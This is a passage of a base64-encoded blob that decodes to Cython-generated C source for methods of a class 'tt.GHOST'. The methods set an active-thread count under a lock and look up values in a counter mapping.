D0gdmFsdWVzWzBdO1xuICAgIF9fcHl4X3ZfY291bnQgPSB2YWx1ZXNbMV07XG4gIH1cbiAgZ290byBfX3B5eF9MNl9za2lwO1xuICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7XG4gIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJzZXRfYWN0aXZlX3RocmVhZHMiLCAxLCAyLCAyLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCA3MSwgX19weXhfTDNfZXJyb3IpXG4gIF9fcHl4X0w2X3NraXA6O1xuICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lO1xuICBfX3B5eF9MM19lcnJvcjo7XG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0dC5HSE9TVC5zZXRfYWN0aXZlX3RocmVhZHMiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBOVUxMO1xuICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7XG4gIF9fcHl4X3IgPSBfX3B5eF9wZl8ydHRfNUdIT1NUXzRzZXRfYWN0aXZlX3RocmVhZHMoX19weXhfc2VsZiwgX19weXhfdl9zZWxmLCBfX3B5eF92X2NvdW50KTtcblxuICBcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnR0XzVHSE9TVF80c2V0X2FjdGl2ZV90aHJlYWRzKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X2NvdW50KSB7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF82O1xuICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzkgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xMCA9IE5VTEw7XG4gIGludCBfX3B5eF90XzExO1xuICBpbnQgX19weXhfdF8xMjtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgic2V0X2FjdGl2ZV90aHJlYWRzIiwgMCk7XG5cbiAgXG4gICB7XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9sb2NrKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNzIsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZXhpdCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDcyLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICBfX3B5eF90XzQgPSBOVUxMO1xuICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW50ZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA3MiwgX19weXhfTDNfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgX19weXhfdF82ID0gMTtcbiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgaWYgKGxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkge1xuICAgICAgX19weXhfdF80ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF81KTtcbiAgICAgIGFzc2VydChfX3B5eF90XzQpO1xuICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19weXhfdF82ID0gMDtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAge1xuICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNCwgTlVMTH07XG4gICAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKV9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMS1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNzIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgfVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICB7XG4gICAgICB7XG4gICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzcsICZfX3B5eF90XzgsICZfX3B5eF90XzkpO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTtcbiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzkpO1xuICAgICAgICAge1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb3VudGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNzMsIF9fcHl4X0w3X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgICAgICAgIGlmICh1bmxpa2VseSgoUHlPYmplY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hY3RpdmVfdGhyZWFkcywgX19weXhfdl9jb3VudCkgPCAwKSkpIF9fUFlYX0VSUigwLCA3MywgX19weXhfTDdfZXJyb3IpXG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgICBnb3RvIF9fcHl4X0wxMl90cnlfZW5kO1xuICAgICAgICBfX3B5eF9MN19lcnJvcjo7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgIHtcbiAgICAgICAgICBfX1B5eF9BZGRUcmFjZWJhY2soInR0LkdIT1NULnNldF9hY3RpdmVfdGhyZWFkcyIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgICAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMSwgJl9fcHl4X3RfMywgJl9fcHl4X3RfNSkgPCAwKSBfX1BZWF9FUlIoMCwgNzIsIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICBfX3B5eF90XzQgPSBQeVR1cGxlX1BhY2soMywgX19weXhfdF8xLCBfX3B5eF90XzMsIF9fcHl4X3RfNSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDcyLCBfX3B5eF9MOV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8yLCBfX3B5eF90XzQsIE5VTEwpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCA3MiwgX19weXhfTDlfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMTApO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgICAgaWYgKF9fcHl4X3RfMTEgPCAoMCkpIF9fUFlYX0VSUigwLCA3MiwgX19weXhfTDlfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIF9fcHl4X3RfMTIgPSAoIV9fcHl4X3RfMTEpO1xuICAgICAgICAgIGlmICh1bmxpa2VseShfX3B5eF90XzEyKSkge1xuICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzEpO1xuICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzMpO1xuICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF81KTtcbiAgICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmVXaXRoU3RhdGUoX19weXhfdF8xLCBfX3B5eF90XzMsIF9fcHl4X3RfNSk7XG4gICAgICAgICAgICBfX3B5eF90XzEgPSAwOyAgX19weXhfdF8zID0gMDsgIF9fcHl4X3RfNSA9IDA7IFxuICAgICAgICAgICAgX19QWVhfRVJSKDAsIDcyLCBfX3B5eF9MOV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgfVxuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgIGdvdG8gX19weXhfTDhfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfTDlfZXhjZXB0X2Vycm9yOjtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF85KTtcbiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzgsIF9fcHl4X3RfOSk7XG4gICAgICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgICAgIF9fcHl4X0w4X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF85KTtcbiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzgsIF9fcHl4X3RfOSk7XG4gICAgICAgIF9fcHl4X0wxMl90cnlfZW5kOjtcbiAgICAgIH1cbiAgICB9XG4gICAgIHtcbiAgICAgIHtcbiAgICAgICAgaWYgKF9fcHl4X3RfMikge1xuICAgICAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSwgTlVMTCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgNzIsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgICB9XG4gICAgICAgIGdvdG8gX19weXhfTDY7XG4gICAgICB9XG4gICAgICBfX3B5eF9MNjo7XG4gICAgfVxuICAgIGdvdG8gX19weXhfTDE2O1xuICAgIF9fcHl4X0wzX2Vycm9yOjtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0wxNjo7XG4gIH1cblxuICBcblxuICBcbiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTtcbiAgZ290byBfX3B5eF9MMDtcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1Quc2V0X2FjdGl2ZV90aHJlYWRzIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX3B5eF9MMDo7XG4gIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cblxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnR0XzVHSE9TVF83Z2V0X2NvdW50ZXIoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbik7IFxuc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMnR0XzVHSE9TVF83Z2V0X2NvdW50ZXIgPSB7ImdldF9jb3VudGVyIiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18ydHRfNUdIT1NUXzdnZXRfY291bnRlciwgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnR0XzVHSE9TVF83Z2V0X2NvdW50ZXIoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbikge1xuICBQeU9iamVjdCAqX19weXhfdl9zZWxmID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X3Zfa2V5ID0gMDtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7XG4gICNlbmRpZlxuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0KiB2YWx1ZXNbMl0gPSB7MCwwfTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBQeU9iamVjdCAqX19weXhfciA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZXRfY291bnRlciAod3JhcHBlcikiLCAwKTtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpO1xuICAjZWxzZVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMO1xuICAjZW5kaWZcbiAgI2VuZGlmXG4gIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpO1xuICB7XG4gICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2VsZiwmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2tleSwwfTtcbiAgICBjb25zdCBQeV9zc2l6ZV90IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDtcbiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDc1LCBfX3B5eF9MM19lcnJvcilcbiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7XG4gICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7XG4gICAgICAgIGNhc2UgIDI6XG4gICAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTtcbiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMV0pKSBfX1BZWF9FUlIoMCwgNzUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDE6XG4gICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgNzUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDA6IGJyZWFrO1xuICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgICAgfVxuICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJncztcbiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJnZXRfY291bnRlciIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgNzUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDI7IGkrKykge1xuICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImdldF9jb3VudGVyIiwgMSwgMiwgMiwgaSk7IF9fUFlYX0VSUigwLCA3NSwgX19weXhfTDNfZXJyb3IpIH1cbiAgICAgIH1cbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDIpKSB7XG4gICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgIH0gZWxzZSB7XG4gICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCA3NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICB2YWx1ZXNbMV0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMSk7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1sxXSkpIF9fUFlYX0VSUigwLCA3NSwgX19weXhfTDNfZXJyb3IpXG4gICAgfVxuICAgIF9fcHl4X3Zfc2VsZiA9IHZhbHVlc1swXTtcbiAgICBfX3B5eF92X2tleSA9IHZhbHVlc1sxXTtcbiAgfVxuICBnb3RvIF9fcHl4X0w2X3NraXA7XG4gIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjtcbiAgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImdldF9jb3VudGVyIiwgMSwgMiwgMiwgX19weXhfbmFyZ3MpOyBfX1BZWF9FUlIoMCwgNzUsIF9fcHl4X0wzX2Vycm9yKVxuICBfX3B5eF9MNl9za2lwOjtcbiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTtcbiAgX19weXhfTDNfZXJyb3I6O1xuICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7XG4gICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pO1xuICB9XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1QuZ2V0X2NvdW50ZXIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBOVUxMO1xuICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7XG4gIF9fcHl4X3IgPSBfX3B5eF9wZl8ydHRfNUdIT1NUXzZnZXRfY291bnRlcihfX3B5eF9zZWxmLCBfX3B5eF92X3NlbGYsIF9fcHl4X3Zfa2V5KTtcblxuICBcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnR0XzVHSE9TVF82Z2V0X2NvdW50ZXIoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfa2V5KSB7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF82O1xuICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzkgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xMCA9IE5VTEw7XG4gIGludCBfX3B5eF90XzExO1xuICBpbnQgX19weXhfdF8xMjtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZ2V0X2NvdW50ZXIiLCAwKTtcblxuICBcbiAgIHtcbiAg